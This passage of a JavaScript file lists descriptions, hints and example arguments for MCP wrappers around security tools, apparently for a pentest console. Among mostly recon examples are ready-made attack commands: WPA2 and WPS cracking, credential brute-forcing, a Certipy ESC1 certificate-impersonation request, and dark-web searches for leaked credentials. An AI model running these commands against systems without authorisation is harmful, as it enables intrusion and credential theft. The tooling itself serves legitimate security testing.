/**
 * Static hints and example values for common MCP server tools.
 * Keyed by tool name (exact match from tools/list).
 * Each entry has:
 *   - examples: array of { label, value } — clickable chips that populate the field
 *   - hint: short text shown below the input
 */

const HINTS = {

  // ── A2A Scanner ───────────────────────────────────────────────────────────
  run_a2a_scanner: {
    description: 'Scans AI agent endpoints for Agent-to-Agent (A2A) protocol security issues such as prompt injection, data leakage, and unsafe tool exposure. Input is a subcommand (e.g. scan-endpoint) plus a target URL or file. Output is a list of security findings with severity and details.',
    hint: 'Scans AI agent endpoints for A2A protocol security issues. Requires a subcommand first: list-analyzers, scan-endpoint, scan-file, scan-card, scan-directory, or scan-registry.',
    examples: [
      { label: 'List analyzers', value: 'list-analyzers' },
      { label: 'Scan endpoint', value: 'scan-endpoint https://agent.example.com' },
      { label: 'Scan file', value: 'scan-file /path/to/agent-card.json' },
    ],
  },

  // ── Abstract API ──────────────────────────────────────────────────────────
  // Note: abstract-mcp exposes individual structured tools — no run_abstract CLI wrapper.
  abstract_phone_intelligence: {
    description: 'Validates and enriches a phone number using the Abstract API. Input is a phone number in E.164 format (e.g. +14155552671). Output includes carrier, country, line type, and validity status.',
    hint: 'Look up phone number intelligence via AbstractAPI. Pass a phone number (E.164 format). Requires ABSTRACT_PHONE_API_KEY.',
    examples: [
      { label: 'US number', value: '+14155552671' },
      { label: 'UK number', value: '+442071234567' },
    ],
  },

  abstract_email_reputation: {
    description: 'Checks an email address for validity, deliverability, and spam risk via Abstract API. Input is an email address. Output includes quality score, format validity, SMTP check result, and disposable/free-provider flags.',
    hint: 'Check email reputation and deliverability via AbstractAPI. Requires ABSTRACT_EMAIL_API_KEY.',
    examples: [
      { label: 'Check email', value: 'test@example.com' },
    ],
  },

  abstract_iban_validation: {
    description: 'Validates an IBAN bank account number and returns associated bank details via Abstract API. Input is an IBAN string. Output includes validity, bank name, country, and BIC/SWIFT code.',
    hint: 'Validate an IBAN number via AbstractAPI. Requires ABSTRACT_IBAN_API_KEY.',
    examples: [
      { label: 'Validate IBAN', value: 'GB29NWBK60161331926819' },
    ],
  },

  abstract_vat_validation: {
    description: 'Validates a VAT registration number and returns company details via Abstract API. Input is a VAT number (e.g. GB123456789). Output includes validity, company name, and address.',
    hint: 'Validate a VAT number via AbstractAPI. Requires ABSTRACT_VAT_API_KEY.',
    examples: [
      { label: 'Validate VAT', value: 'GB123456789' },
    ],
  },

  abstract_ip_intelligence: {
    description: 'Geolocates an IP address and returns threat intelligence via Abstract API. Input is an IPv4 or IPv6 address. Output includes country, city, ISP, VPN/proxy/Tor detection, and threat score.',
    hint: 'Look up IP geolocation and intelligence via AbstractAPI. Requires ABSTRACT_IP_API_KEY.',
    examples: [
      { label: 'Lookup IP', value: '8.8.8.8' },
      { label: 'Private IP', value: '192.168.1.1' },
    ],
  },

  abstract_holidays: {
    description: 'Returns public holidays for a country and year via Abstract API. Input is a country code (ISO 3166-1 alpha-2), year, and optional month/day. Output is a list of holiday names and dates.',
    hint: 'Look up public holidays for a country and date via AbstractAPI. Requires ABSTRACT_HOLIDAYS_API_KEY.',
    examples: [
      { label: 'US 2024', value: 'US 2024 1 1' },
    ],
  },

  abstract_exchange_rates: {
    description: 'Fetches live currency exchange rates via Abstract API. Input is a base currency code and optional target currency. Output is the current exchange rate.',
    hint: 'Get live currency exchange rates via AbstractAPI. Requires ABSTRACT_EXCHANGE_API_KEY.',
    examples: [
      { label: 'USD to EUR', value: 'USD EUR' },
    ],
  },

  abstract_company_enrichment: {
    description: 'Returns firmographic data for a company by domain via Abstract API. Input is a domain name. Output includes company name, industry, employee count, and social profiles.',
    hint: 'Enrich company data by domain via AbstractAPI. Requires ABSTRACT_COMPANY_API_KEY.',
    examples: [
      { label: 'Enrich domain', value: 'google.com' },
    ],
  },

  abstract_timezone: {
    description: 'Returns the current time and timezone for a location via Abstract API. Input is a city or location name. Output includes timezone name, UTC offset, and current local time.',
    hint: 'Get current time for a location via AbstractAPI. Requires ABSTRACT_TIMEZONE_API_KEY.',
    examples: [
      { label: 'London', value: 'London' },
      { label: 'New York', value: 'New York' },
    ],
  },

  // ── Abuse.ch / abusech-mcp ────────────────────────────────────────────────
  // Note: abusech-mcp exposes individual structured tools — no run_abusech CLI wrapper.
  urlhaus_host: {
    description: 'Queries URLhaus for malicious URLs associated with a hostname or IP. Input is a hostname or IP address. Output lists known malware-distributing URLs, dates, and threat tags.',
    hint: 'Get URLhaus host report for a hostname or IP address. Returns malicious URL records associated with the host.',
    examples: [
      { label: 'Hostname', value: 'evil.example.com' },
      { label: 'IP address', value: '185.220.101.1' },
    ],
  },

  urlhaus_url: {
    description: 'Looks up a specific URL in the URLhaus malware database. Input is a full URL. Output indicates if it is blacklisted, its status, and associated malware tags.',
    hint: 'Get URLhaus URL report for a specific URL. Returns malware distribution status and payload info.',
    examples: [
      { label: 'Check URL', value: 'https://example.com/malware.exe' },
    ],
  },

  malwarebazaar_hash: {
    description: 'Looks up a file hash in MalwareBazaar to check if it is known malware. Input is a SHA-256 hash. Output includes malware family, file type, first-seen date, and AV tags.',
    hint: 'Get MalwareBazaar info for a file SHA256 hash. Returns malware family, tags, and YARA matches.',
    examples: [
      { label: 'SHA256 hash', value: '44d88612fea8a8f36de82e1278abb02f5abbbe43f334f2d1fd6b3c9e3e6e7b08' },
    ],
  },

  threatfox_iocs: {
    description: 'Retrieves recent threat indicators of compromise (IOCs) from ThreatFox. Input is optional days (1-365). Output is a list of IPs, domains, URLs, and hashes associated with malware campaigns.',
    hint: 'Get recent ThreatFox IOCs (indicators of compromise). Optionally specify days (1–365, default 7).',
    examples: [
      { label: 'Last 7 days', value: '7' },
      { label: 'Last 30 days', value: '30' },
    ],
  },

  run_abuseipdb: {
    description: 'Checks an IP address against the AbuseIPDB crowdsourced blacklist. Input is an IP address with optional --check or --report flags. Output includes abuse confidence score, ISP, country, and recent report count.',
    hint: 'Check or report an IP address against the AbuseIPDB crowd-sourced threat database. Requires API key.',
    examples: [
      { label: 'Check IP', value: 'check 192.168.1.1' },
      { label: 'Check with days', value: 'check 8.8.8.8 --days 90' },
      { label: 'Report IP', value: 'report 192.168.1.1 --categories 18,22 --comment "SSH brute force"' },
      { label: 'Blacklist', value: 'blacklist --limit 100' },
    ],
  },

  // ── Acuvity / Proxied Tools ────────────────────────────────────────────────
  run_acuvity_atlas_docs: {
    description: 'Searches and retrieves documentation from Atlassian product docs (Jira, Confluence). Input is a search query. Output is relevant documentation content.',
    hint: 'Search MongoDB Atlas documentation via Acuvity proxy.',
    examples: [
      { label: 'Search docs', value: 'Atlas connection string' },
      { label: 'Security topic', value: 'Atlas network access control' },
    ],
  },

  run_acuvity_atlassian: {
    description: 'Interacts with Atlassian APIs (Jira, Confluence). Input is a command with project/issue identifiers. Output is issue details, search results, or page content.',
    hint: 'Interact with Jira/Confluence via Acuvity proxy. Requires Atlassian credentials.',
    examples: [
      { label: 'List issues', value: 'jira list-issues project=SEC' },
      { label: 'Search Confluence', value: 'confluence search "security policy"' },
    ],
  },

  run_acuvity_azure: {
    description: 'Runs Azure CLI commands against Azure cloud resources. Input is an Azure CLI command string. Output is the Azure API response for that command.',
    hint: 'Azure resource operations via Acuvity proxy. Requires Azure credentials.',
    examples: [
      { label: 'List VMs', value: 'vm list --resource-group myRG' },
      { label: 'Storage accounts', value: 'storage account list' },
    ],
  },

  acuvity_mcp_server_azure_info: {
    description: 'Returns status and version information for the Acuvity Azure MCP server. No input required.',
    hint: 'Returns status and basic info for the Microsoft Azure MCP Server (Acuvity proxy). No arguments required.',
    examples: [],
  },

  run_acuvity_bing_search: {
    description: 'Performs a Bing web search. Input is a search query string. Output is a list of web results with titles, URLs, and snippets.',
    hint: 'Bing web search via Acuvity proxy. Requires Bing API key.',
    examples: [
      { label: 'Search', value: 'CVE-2024-1234 exploit' },
      { label: 'Site search', value: 'site:github.com nuclei templates' },
    ],
  },

  run_acuvity_brave_search: {
    description: 'Performs a Brave Search web query. Input is a search query. Output is a list of search results with titles and URLs.',
    hint: 'Brave web search via Acuvity proxy.',
    examples: [
      { label: 'General search', value: 'log4shell mitigation' },
      { label: 'News', value: 'ransomware 2024' },
    ],
  },

  run_acuvity_calculator: {
    description: 'Evaluates mathematical expressions. Input is a math expression string. Output is the computed result.',
    hint: 'Safe calculator for arithmetic expressions via Acuvity proxy.',
    examples: [
      { label: 'Basic math', value: '2 ** 32' },
      { label: 'Subnet calc', value: '192.168.1.0 / 24' },
    ],
  },

  acuvity_mcp_server_calculator_info: {
    description: 'Returns status info for the Acuvity calculator MCP server. No input required.',
    hint: 'Returns status and basic info for the Calculator MCP Server (Acuvity proxy). No arguments required.',
    examples: [],
  },

  run_acuvity_docker: {
    description: 'Runs Docker CLI commands. Input is a Docker command string (e.g. ps, images, inspect). Output is the Docker CLI response.',
    hint: 'Docker operations via Acuvity proxy.',
    examples: [
      { label: 'List images', value: 'images ls' },
      { label: 'List containers', value: 'ps -a' },
      { label: 'Run container', value: 'run ubuntu:22.04 bash' },
    ],
  },

  run_acuvity_duckduckgo: {
    description: 'Performs a DuckDuckGo web search. Input is a search query. Output is a list of search results.',
    hint: 'DuckDuckGo privacy-preserving search via Acuvity proxy.',
    examples: [
      { label: 'Search', value: 'open redirect vulnerability' },
      { label: 'Instant answer', value: 'what is SSRF' },
    ],
  },

  run_acuvity_fetch: {
    description: 'Fetches the content of a URL. Input is a URL. Output is the page HTML or text content.',
    hint: 'Fetch a URL and return its content via Acuvity proxy.',
    examples: [
      { label: 'Fetch page', value: 'https://example.com' },
      { label: 'Fetch JSON API', value: 'https://api.example.com/v1/status' },
    ],
  },

  run_acuvity_firecrawl: {
    description: 'Crawls a website using Firecrawl to extract structured content. Input is a URL. Output is scraped page text and metadata.',
    hint: 'AI-friendly web scraping and crawling via Acuvity/Firecrawl proxy.',
    examples: [
      { label: 'Crawl site', value: 'crawl https://example.com' },
      { label: 'Scrape page', value: 'scrape https://example.com/about' },
    ],
  },

  run_acuvity_google_maps: {
    description: 'Queries Google Maps for places, directions, or geocoding. Input is a location query or address. Output is place details or coordinates.',
    hint: 'Google Maps geocoding and place lookups via Acuvity proxy. Requires Google API key.',
    examples: [
      { label: 'Geocode', value: 'geocode 1600 Amphitheatre Parkway, Mountain View' },
      { label: 'Place search', value: 'search data centers near London' },
    ],
  },

  run_acuvity_grafana: {
    description: 'Queries Grafana dashboards and datasources. Input is a Grafana query or dashboard ID. Output is metrics data or dashboard details.',
    hint: 'Query Grafana dashboards and alerts via Acuvity proxy.',
    examples: [
      { label: 'List dashboards', value: 'dashboards list' },
      { label: 'Get alerts', value: 'alerts list --state firing' },
    ],
  },

  run_acuvity_notion: {
    description: 'Reads and writes Notion pages and databases. Input is a page ID or query. Output is Notion page content or search results.',
    hint: 'Read/write Notion pages via Acuvity proxy. Requires Notion API key.',
    examples: [
      { label: 'Search pages', value: 'search "security runbook"' },
      { label: 'Get page', value: 'page get <page-id>' },
    ],
  },

  run_acuvity_playwright: {
    description: 'Controls a headless browser using Playwright to interact with web pages. Input is a URL and optional actions. Output is page content or screenshots.',
    hint: 'Browser automation and screenshot capture via Acuvity/Playwright proxy.',
    examples: [
      { label: 'Screenshot', value: 'screenshot https://example.com' },
      { label: 'Click element', value: 'click https://example.com "#login-btn"' },
    ],
  },

  run_acuvity_sentry: {
    description: 'Queries Sentry for errors and issues. Input is a project slug or issue ID. Output is error details, stack traces, and occurrence counts.',
    hint: 'Query Sentry error tracking via Acuvity proxy. Requires Sentry token.',
    examples: [
      { label: 'List issues', value: 'issues list --project my-app' },
      { label: 'Get event', value: 'event get <event-id>' },
    ],
  },

  run_acuvity_slack: {
    description: 'Sends messages and reads channels in Slack. Input is a channel name and message text. Output is confirmation or channel history.',
    hint: 'Send/read Slack messages via Acuvity proxy. Requires Slack token.',
    examples: [
      { label: 'Post message', value: 'post #security "Alert: new critical CVE"' },
      { label: 'List channels', value: 'channels list' },
    ],
  },

  // ── Adblock MCP ───────────────────────────────────────────────────────────
  run_adblock: {
    description: 'Tests URLs against ad-blocking filter lists to determine if they would be blocked. Input is a URL. Output indicates if the URL matches known ad/tracker patterns.',
    hint: 'Check a URL or domain against ad/tracking block lists.',
    examples: [
      { label: 'Check domain', value: 'example.com' },
      { label: 'Check URL', value: 'https://ads.example.com/track.js' },
    ],
  },

  // ── AdGuard DNS ───────────────────────────────────────────────────────────
  run_adguard_dns: {
    description: "Performs DNS lookups using AdGuard's filtered DNS service to check if domains are blocked. Input is a domain name. Output is DNS response and block status.",
    hint: 'Query AdGuard DNS filtering and check whether a domain is blocked.',
    examples: [
      { label: 'Check domain', value: 'malware.example.com' },
      { label: 'Safe domain', value: 'example.com' },
    ],
  },

  // ── Ahmia ─────────────────────────────────────────────────────────────────
  run_ahmia: {
    description: 'Searches the Ahmia Tor hidden service search engine for .onion sites. Input is a search query. Output is a list of matching .onion URLs and descriptions.',
    hint: 'Search Ahmia.fi for .onion hidden services on the Tor network.',
    examples: [
      { label: 'Search term', value: 'leaked credentials' },
      { label: 'Search market', value: 'darkweb market' },
      { label: 'Search forum', value: 'hacking forum' },
    ],
  },

  // ── Aircrack-ng ───────────────────────────────────────────────────────────
  run_aircrack_ng: {
    description: 'Cracks WEP and WPA/WPA2 WiFi passwords from captured packet files. Input is a pcap file path and optional wordlist. Output is the cracked WiFi password if successful.',
    hint: 'Crack WEP/WPA/WPA2 keys from captured .cap/.pcap files.',
    examples: [
      { label: 'WPA2 crack', value: '-w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture.cap' },
      { label: 'WEP crack', value: 'capture.cap' },
      { label: 'PMKID attack', value: '--pmkid -w wordlist.txt capture.hccapx' },
    ],
  },

  // ── AlterX ────────────────────────────────────────────────────────────────
  run_alterx: {
    description: 'Generates permutations of subdomains for discovery. Input is a domain name with optional wordlist. Output is a list of generated subdomain permutations.',
    hint: 'Generate subdomain permutations for a given domain.',
    examples: [
      { label: 'Basic permute', value: '-d example.com' },
      { label: 'With wordlist', value: '-d example.com -w words.txt' },
      { label: 'Enrich list', value: '-l subdomains.txt' },
    ],
  },

  // ── Amass ─────────────────────────────────────────────────────────────────
  run_amass: {
    description: 'Performs in-depth DNS enumeration and subdomain discovery using multiple data sources. Input is a domain name with optional flags like enum or intel. Output is a list of discovered subdomains and IPs.',
    hint: 'Subdomain enumeration and OSINT — passive or active DNS reconnaissance.',
    examples: [
      { label: 'Passive enum', value: 'enum -passive -d example.com' },
      { label: 'Active enum', value: 'enum -active -d example.com' },
      { label: 'Intel WHOIS', value: 'intel -d example.com -whois' },
      { label: 'Brute-force', value: 'enum -brute -d example.com -w wordlist.txt' },
    ],
  },

  // ── Anew ──────────────────────────────────────────────────────────────────
  run_anew: {
    description: 'Filters a list of items to output only new lines not seen before, tracking state in a file. Input is a newline-separated list. Output contains only previously-unseen entries.',
    hint: 'Append only new unique lines to a file — useful for deduplicating recon output.',
    examples: [
      { label: 'Append new', value: 'new_subs.txt existing_subs.txt' },
      { label: 'Stdin dedup', value: '- output.txt' },
    ],
  },

  // ── Angr ──────────────────────────────────────────────────────────────────
  run_angr: {
    description: 'Performs binary analysis and symbolic execution on executables. Input is a binary file path with analysis flags. Output is code analysis results, function signatures, or vulnerability findings.',
    hint: 'Binary analysis and symbolic execution framework for vulnerability research.',
    examples: [
      { label: 'Analyse binary', value: 'analyze /path/to/binary' },
      { label: 'Find vuln path', value: 'find-path /path/to/binary --find 0x4006a0 --avoid 0x400550' },
      { label: 'CFG generation', value: 'cfg /path/to/binary' },
    ],
  },

  // ── Aquatone ──────────────────────────────────────────────────────────────
  run_aquatone: {
    description: 'Takes screenshots of web pages and compiles them into a report for visual reconnaissance. Input is a list of URLs or IP ranges. Output is HTML report with screenshots.',
    hint: 'Take screenshots of web pages from a list of URLs/hosts for visual recon.',
    examples: [
      { label: 'From file', value: '-hosts hosts.txt -out aquatone_output' },
      { label: 'Custom ports', value: '-hosts hosts.txt -ports 80,443,8080,8443' },
      { label: 'Nmap XML input', value: '-nmap -out aquatone_output < nmap.xml' },
    ],
  },

  // ── Archive.org ───────────────────────────────────────────────────────────
  run_archiveorg: {
    description: 'Queries the Internet Archive Wayback Machine for historical snapshots of websites. Input is a URL and optional date. Output is a list of archived snapshots with timestamps.',
    hint: 'Query the Wayback Machine for historical snapshots of a URL.',
    examples: [
      { label: 'Get snapshots', value: 'https://example.com' },
      { label: 'Specific year', value: 'https://example.com --year 2020' },
      { label: 'List all URLs', value: 'https://example.com --output-urls' },
    ],
  },

  // ── ARIN ──────────────────────────────────────────────────────────────────
  run_arin: {
    description: 'Queries ARIN (American Registry for Internet Numbers) for IP ownership and ASN information. Input is an IP address or ASN. Output is registration details, organization name, and address range.',
    hint: 'Query ARIN WHOIS for IP address and ASN registration data.',
    examples: [
      { label: 'IP lookup', value: '8.8.8.8' },
      { label: 'ASN lookup', value: 'AS15169' },
      { label: 'Org search', value: 'org Google' },
    ],
  },

  // ── Arjun ─────────────────────────────────────────────────────────────────
  run_arjun: {
    description: 'Discovers hidden HTTP parameters in web applications. Input is a URL with optional method flag. Output is a list of discovered query parameters.',
    hint: 'HTTP parameter discovery tool — find hidden GET/POST parameters.',
    examples: [
      { label: 'GET params', value: '-u https://example.com/page' },
      { label: 'POST params', value: '-u https://example.com/api --post' },
      { label: 'JSON params', value: '-u https://example.com/api --json' },
      { label: 'Custom wordlist', value: '-u https://example.com -w params.txt' },
    ],
  },

  // ── ARP Scan ──────────────────────────────────────────────────────────────
  run_arp_scan: {
    description: 'Discovers live hosts on a local network using ARP requests. Input is a network range (e.g. 192.168.1.0/24). Output is a list of IP addresses and MAC addresses of active hosts.',
    hint: 'Send ARP requests to discover live hosts on a local network.',
    examples: [
      { label: 'Local subnet', value: '--localnet' },
      { label: 'CIDR range', value: '192.168.1.0/24' },
      { label: 'Specific interface', value: '-I eth0 192.168.1.0/24' },
    ],
  },

  // ── ASNMap ────────────────────────────────────────────────────────────────
  // Note: asnmap-mcp exposes individual structured tools — no run_asnmap CLI wrapper.
  lookup_asn: {
    description: 'Looks up an Autonomous System Number (ASN) to find its owner and IP ranges. Input is an ASN number. Output is the organization name and associated IP prefixes.',
    hint: 'Look up IP ranges advertised by an ASN number. Returns CIDR ranges for the autonomous system.',
    examples: [
      { label: 'Google ASN', value: 'AS15169' },
      { label: 'Cloudflare ASN', value: 'AS13335' },
    ],
  },

  lookup_ip: {
    description: 'Maps an IP address to its ASN and organization. Input is an IP address. Output is the ASN number, organization name, and network range.',
    hint: 'Resolve an IP address to its parent ASN, organisation, and network range.',
    examples: [
      { label: 'Google DNS', value: '8.8.8.8' },
      { label: 'Cloudflare DNS', value: '1.1.1.1' },
    ],
  },

  lookup_domain: {
    description: "Resolves a domain name to its ASN information. Input is a domain name. Output is ASN number and organization for the domain's IP.",
    hint: 'Resolve a domain name to its hosting ASN, organisation, and associated network ranges.',
    examples: [
      { label: 'Domain lookup', value: 'example.com' },
      { label: 'Subdomain', value: 'mail.google.com' },
    ],
  },

  lookup_org: {
    description: 'Searches for ASNs registered to an organization name. Input is an organization name string. Output is a list of matching ASNs and their IP ranges.',
    hint: 'Search for ASN records by organisation name. Returns matching ASNs and their network ranges.',
    examples: [
      { label: 'Google', value: 'Google LLC' },
      { label: 'Amazon', value: 'Amazon' },
    ],
  },

  // ── Assetfinder ───────────────────────────────────────────────────────────
  run_assetfinder: {
    description: 'Discovers subdomains and related assets for a domain using passive sources. Input is a domain name. Output is a list of discovered subdomains.',
    hint: 'Find domains and subdomains related to a target using passive sources.',
    examples: [
      { label: 'All subdomains', value: 'example.com' },
      { label: 'Subs only', value: '--subs-only example.com' },
    ],
  },

  // ── AutoRecon ─────────────────────────────────────────────────────────────
  run_autorecon: {
    description: 'Automated multi-stage reconnaissance tool that runs nmap, then targeted enumeration based on open ports. Input is a target IP or hostname. Output is a structured directory of scan results.',
    hint: 'Automated multi-tool reconnaissance on targets — runs nmap, nikto, etc.',
    examples: [
      { label: 'Single target', value: '192.168.1.1' },
      { label: 'Multiple targets', value: '192.168.1.1 192.168.1.2 192.168.1.3' },
      { label: 'From file', value: '--targets targets.txt' },
      { label: 'Only port scan', value: '--only-scans-dir 192.168.1.1' },
    ],
  },

  // ── AWS API ───────────────────────────────────────────────────────────────
  run_aws_api: {
    description: 'Executes AWS API calls using the AWS CLI. Input is an AWS CLI command (e.g. s3 ls, ec2 describe-instances). Output is the AWS API response in JSON.',
    hint: 'Execute AWS API calls. Requires configured AWS credentials.',
    examples: [
      { label: 'List S3 buckets', value: 's3 list-buckets' },
      { label: 'EC2 instances', value: 'ec2 describe-instances' },
      { label: 'IAM users', value: 'iam list-users' },
      { label: 'Security groups', value: 'ec2 describe-security-groups' },
    ],
  },

  // ── Bearer ────────────────────────────────────────────────────────────────
  run_bearer: {
    description: 'Scans source code for security vulnerabilities, secret leaks, and OWASP top-10 issues using Bearer. Input is a path to code. Output is a list of findings with severity and file locations.',
    hint: 'Static analysis tool for detecting security and privacy risks in source code.',
    examples: [
      { label: 'Scan directory', value: 'scan /path/to/project' },
      { label: 'Specific rules', value: 'scan --only-rule ruby_lang_cookies /path/to/project' },
      { label: 'JSON report', value: 'scan --format json /path/to/project' },
    ],
  },

  // ── BeVigil ───────────────────────────────────────────────────────────────
  run_bevigil: {
    description: 'Queries BeVigil for mobile app security intelligence and API endpoints. Input is a domain or app identifier. Output is API endpoints, secrets, and vulnerability data found in mobile apps.',
    hint: 'Query BeVigil OSINT API for mobile app intelligence. Requires API key.',
    examples: [
      { label: 'Domain search', value: '--domain example.com' },
      { label: 'API key leak', value: '--api-key-search example.com' },
      { label: 'App search', value: '--app "banking app"' },
    ],
  },

  // ── Binwalk ───────────────────────────────────────────────────────────────
  run_binwalk: {
    description: 'Analyzes and extracts embedded files from firmware and binary images. Input is a file path with optional flags (-e to extract). Output is a map of detected file signatures and offsets.',
    hint: 'Firmware analysis and extraction tool.',
    examples: [
      { label: 'Scan firmware', value: 'firmware.bin' },
      { label: 'Extract files', value: '-e firmware.bin' },
      { label: 'Entropy analysis', value: '-E firmware.bin' },
      { label: 'Recursive extract', value: '-Me firmware.bin' },
    ],
  },

  // ── Blackbird ─────────────────────────────────────────────────────────────
  run_blackbird: {
    description: 'Searches for a username across hundreds of social media platforms and websites. Input is a username. Output is a list of sites where the username was found, with profile URLs.',
    hint: 'OSINT tool to find accounts registered with an email or username across platforms.',
    examples: [
      { label: 'Email search', value: '-e test@example.com' },
      { label: 'Username search', value: '-u johndoe' },
      { label: 'Save results', value: '-e test@example.com --json' },
    ],
  },

  // ── BloodHound ────────────────────────────────────────────────────────────
  run_bloodhound: {
    description: 'Analyzes Active Directory relationships to find attack paths to Domain Admin. Input is BloodHound query or data collection flags. Output is privilege escalation paths and AD relationships.',
    hint: 'Active Directory attack path analysis. Ingest SharpHound data to find privilege escalation paths.',
    examples: [
      { label: 'Ingest JSON', value: '--ingest /path/to/BloodHound.zip' },
      { label: 'Find DA paths', value: 'query "MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:\'DOMAIN ADMINS@EXAMPLE.LOCAL\'})) RETURN p"' },
      { label: 'Kerberoastable', value: 'query "MATCH (u:User {hasspn:true}) RETURN u.name"' },
    ],
  },

  // ── Boofuzz ───────────────────────────────────────────────────────────────
  run_boofuzz: {
    description: 'Fuzzes network protocols to find crashes and vulnerabilities. Input is a target host/port with protocol definition. Output is a log of crash-inducing payloads and server responses.',
    hint: 'Network protocol fuzzer for finding buffer overflows and crashes.',
    examples: [
      { label: 'Fuzz target', value: '--target-host 192.168.1.1 --target-port 80' },
      { label: 'Resume session', value: '--restart-sleep-time 5 --target-host 192.168.1.1 --target-port 21' },
    ],
  },

  // ── Brave Search ──────────────────────────────────────────────────────────
  run_brave_search: {
    description: 'Searches the web using the Brave Search API. Input is a search query. Output is a list of web results with titles, URLs, and descriptions.',
    hint: 'Brave privacy-preserving web search. Requires Brave Search API key.',
    examples: [
      { label: 'Search', value: 'CVE-2024 critical vulnerabilities' },
      { label: 'News', value: 'cybersecurity breach 2024' },
      { label: 'Technical', value: 'exploit writeup log4shell' },
    ],
  },

  // ── BruteSpray ────────────────────────────────────────────────────────────
  run_brutespray: {
    description: 'Automatically brute-forces services discovered by nmap using default credentials. Input is an nmap XML output file. Output is a list of services with valid credentials found.',
    hint: 'Auto-brute-force services discovered in an Nmap XML scan.',
    examples: [
      { label: 'From nmap XML', value: '--file nmap.xml --threads 5' },
      { label: 'Specific service', value: '--file nmap.xml --service ssh --threads 5' },
      { label: 'Custom creds', value: '--file nmap.xml -U users.txt -P passwords.txt' },
    ],
  },

  // ── Brutus ────────────────────────────────────────────────────────────────
  run_brutus: {
    description: 'Legacy network password cracker for HTTP, FTP, POP3, SMB, and Telnet. Input is a target host and service type with optional wordlist. Output is discovered valid credentials.',
    hint: 'Online password cracker supporting HTTP, FTP, POP3, SMB, Telnet.',
    examples: [
      { label: 'HTTP basic', value: '-h 192.168.1.1 -u admin -w passwords.txt -t HTTP' },
      { label: 'FTP brute', value: '-h 192.168.1.1 -u ftp -w passwords.txt -t FTP' },
    ],
  },

  // ── BuiltWith ─────────────────────────────────────────────────────────────
  run_builtwith: {
    description: 'Identifies technologies, frameworks, and services used by a website. Input is a domain name. Output is a list of detected technologies with categories and versions.',
    hint: 'Detect technologies used by a website. Requires BuiltWith API key.',
    examples: [
      { label: 'Tech stack', value: 'example.com' },
      { label: 'Full profile', value: '--full example.com' },
    ],
  },

  // ── Bully ─────────────────────────────────────────────────────────────────
  run_bully: {
    description: 'Exploits WPS (Wi-Fi Protected Setup) vulnerabilities to recover WPA/WPA2 passwords. Input is a wireless interface and BSSID. Output is the recovered WPS PIN and WiFi password.',
    hint: 'WPS brute-force attack tool.',
    examples: [
      { label: 'WPS attack', value: '-b AA:BB:CC:DD:EE:FF -i wlan0mon' },
      { label: 'With PIN', value: '-b AA:BB:CC:DD:EE:FF -i wlan0mon -p 12345670' },
    ],
  },

  // ── CAPA ──────────────────────────────────────────────────────────────────
  run_capa: {
    description: 'Analyzes malware binaries to identify their capabilities using rule-based detection. Input is a binary file path. Output is a list of capabilities (e.g. network communication, file encryption, persistence).',
    hint: 'Detect capabilities in malware binaries using FLARE rule matching.',
    examples: [
      { label: 'Analyse binary', value: 'malware.exe' },
      { label: 'Verbose output', value: '-v malware.exe' },
      { label: 'JSON export', value: '-j malware.exe' },
      { label: 'MITRE ATT&CK', value: '--mitre-attack malware.exe' },
    ],
  },

  // ── Cero ──────────────────────────────────────────────────────────────────
  run_cero: {
    description: 'Extracts subdomain names from SSL/TLS certificates of a target. Input is a domain or IP. Output is a list of subdomain names found in certificate Subject Alternative Names.',
    hint: 'Collect subdomains from TLS certificate transparency logs.',
    examples: [
      { label: 'Enumerate subs', value: 'example.com' },
      { label: 'With concurrency', value: '-c 20 example.com' },
    ],
  },

  // ── CertGraph ─────────────────────────────────────────────────────────────
  run_certgraph: {
    description: 'Maps certificate relationships to discover related domains and infrastructure. Input is a domain name. Output is a graph of domains sharing SSL certificates.',
    hint: 'Crawl certificate transparency logs to map a domain graph.',
    examples: [
      { label: 'Basic crawl', value: 'example.com' },
      { label: 'JSON output', value: '-json example.com' },
      { label: 'Verbose', value: '-verbose example.com' },
    ],
  },

  // ── Certipy ───────────────────────────────────────────────────────────────
  run_certipy: {
    description: 'Enumerates and exploits Active Directory Certificate Services (AD CS) misconfigurations. Input is a target domain with optional attack flags. Output is certificate templates, vulnerable configs, or extracted credentials.',
    hint: 'Active Directory Certificate Services (ADCS) enumeration and exploitation.',
    examples: [
      { label: 'Find templates', value: 'find -u user@example.com -p password -dc-ip 192.168.1.1' },
      { label: 'ESC1 exploit', value: 'req -u user@example.com -p password -ca "EXAMPLE-CA" -template "VulnTemplate" -upn admin@example.com' },
      { label: 'Auth with cert', value: 'auth -pfx admin.pfx -dc-ip 192.168.1.1' },
    ],
  },

  // ── Checkov ───────────────────────────────────────────────────────────────
  run_checkov: {
    description: 'Scans Terraform, CloudFormation, and Kubernetes configs for security misconfigurations. Input is a file or directory path. Output is a list of policy violations with severity and remediation advice.',
    hint: 'IaC security scanning for Terraform, CloudFormation, Kubernetes, Dockerfiles.',
    examples: [
      { label: 'Scan directory', value: '-d /path/to/terraform' },
      { label: 'Specific file', value: '-f main.tf' },
      { label: 'Kubernetes', value: '-d /path/to/k8s --framework kubernetes' },
      { label: 'JSON output', value: '-d /path/to/iac -o json' },
    ],
  },

  // ── Checksec ──────────────────────────────────────────────────────────────
  run_checksec: {
    description: 'Checks binary executables for security mitigations like NX, PIE, RELRO, and stack canaries. Input is a binary file path. Output is a table of enabled/disabled security features.',
    hint: 'Check binary security mitigations (NX, ASLR, PIE, stack canary, RELRO).',
    examples: [
      { label: 'Check binary', value: '--file=/usr/bin/sshd' },
      { label: 'Check process', value: '--proc=nginx' },
      { label: 'All processes', value: '--proc-all' },
      { label: 'JSON output', value: '--file=/usr/bin/sshd --output=json' },
    ],
  },

  // ── Cisco Scanner ─────────────────────────────────────────────────────────
  run_cisco_scanner: {
    description: 'Scans Cisco network devices for known vulnerabilities and misconfigurations. Input is a target IP or range. Output is discovered Cisco devices with vulnerability findings.',
    hint: 'Scan Cisco devices for default credentials and known vulnerabilities.',
    examples: [
      { label: 'Scan host', value: '192.168.1.1' },
      { label: 'Scan range', value: '192.168.1.0/24' },
      { label: 'With creds', value: '-u admin -p cisco 192.168.1.1' },
    ],
  },

  // ── Clair ─────────────────────────────────────────────────────────────────
  run_clair: {
    description: 'Scans container images for known CVE vulnerabilities using Clair. Input is a container image name or path. Output is a list of CVEs affecting the image layers.',
    hint: 'Container image vulnerability scanner using Clair API.',
    examples: [
      { label: 'Scan image', value: 'ubuntu:22.04' },
